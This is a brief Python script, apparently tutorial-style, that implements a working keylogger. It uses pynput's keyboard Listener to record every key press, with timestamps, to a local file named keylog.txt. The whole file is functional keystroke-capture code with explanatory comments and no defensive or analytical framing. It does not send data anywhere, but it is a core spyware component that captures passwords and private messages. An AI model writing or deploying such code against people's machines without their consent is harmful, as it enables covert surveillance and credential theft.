
from pynput.keyboard import Key, Listener  # Import Key and Listener module
import logging  # Import logging module

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Configuration for log structure in the new file created keylog.txt

def on_press(key):
    logging.info(str(key)) # Converts the keywords into string format


with Listener(on_press=on_press) as listener:
    listener.join()  # Listens the input from the keyboard and sends it to on_press function using thread join
